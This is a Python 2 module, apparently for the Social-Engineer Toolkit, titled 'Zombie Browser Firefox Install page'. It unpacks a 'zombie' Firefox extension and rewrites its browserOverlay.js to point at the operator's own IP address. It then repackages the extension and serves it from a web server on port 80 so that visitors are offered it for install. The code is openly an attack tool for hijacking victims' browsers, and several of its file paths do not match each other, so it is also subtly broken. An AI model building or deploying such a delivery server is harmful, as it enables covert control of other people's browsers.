#!/usr/bin/env python
#
# These are required fields
#
import sys
import subprocess
import os
from src.core.menu import text
from src.core import setcore as core
from time import sleep
import urlparse

import zipfile
import glob, os


MAIN = " Zombie Browser Firefox Install page"
AUTHOR = " Z "

#
# This will start a web server in the directory root you specify, so for example
# you clone a website then run it in that web server, it will pull any index.html file
#
def start_basic_web_server(directory):
	try:
	# import the threading, socketserver, and simplehttpserver
		import thread, SocketServer, BaseHTTPServer, SimpleHTTPServer
		# create the httpd handler for the simplehttpserver
		# we set the allow_reuse_address incase something hangs can still bind to port
		#class ReusableTCPServer(SocketServer.TCPServer): allow_reuse_address=True
		# specify the httpd service on 0.0.0.0 (all interfaces) on port 80
		#httpd = ReusableTCPServer(("0.0.0.0", 80), SimpleHTTPServer.SimpleHTTPRequestHandler)

		
		class MyHandler( SimpleHTTPServer.SimpleHTTPRequestHandler ):
				def do_GET( self ):
					if self.path.endswith("xpi"):
						f = open("modules/web/ff_zombieb_lite.xpi", 'r')
						self.send_response(200)
						self.send_header('Content-type', "application/x-xpinstall")
						content = f.read()
						self.send_header('Content-length', len(content))
						self.end_headers()
						self.wfile.write(content)
						return
					else:
						# Default to serve up a local file 
						SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self);

		SimpleHTTPServer.SimpleHTTPRequestHandler.protocol_version = 'HTTP/1.0'
		httpd = BaseHTTPServer.HTTPServer(('', 80), MyHandler)
		# thread this mofo
		os.chdir(directory)

		thread.start_new_thread(httpd.serve_forever, ())

	except KeyboardInterrupt:
		print_info("Exiting the SET web server...")
		httpd.socket.close()

# def main(): header is required
def main():
	print "Module start"	
	file = zipfile.ZipFile("modules/web/ff_zombieb_lite.xpi", "r")
	file.extractall("modules/xpi_source")
	print "XPI extracted"
	source = open("modules/web/xpi_source/chrome/content/browserOverlay.js", "r")
	content = source.read()
	content = content.replace("127.0.0.1", core.grab_ipaddress());
	source.close();
	source = open("modules/web/xpi_source/chrome/content/browserOverlay.js", "w")
	source.write(content);
	source.close();

	print "Content replaced"
	#open the zip file for writing, and write stuff to it

	target_dir = 'modules/xpi_source'
	zip = zipfile.ZipFile('modules/web/ff_zombie_lite.xpi', 'w', zipfile.ZIP_DEFLATED)
	rootlen = len(target_dir) + 1
	for base, dirs, files in os.walk(target_dir):
		for file in files:
			fn = os.path.join(base, file)
			zip.write(fn, fn[rootlen:])

	print "XPI created"
	start_basic_web_server("modules/web")
	print "Web server started"
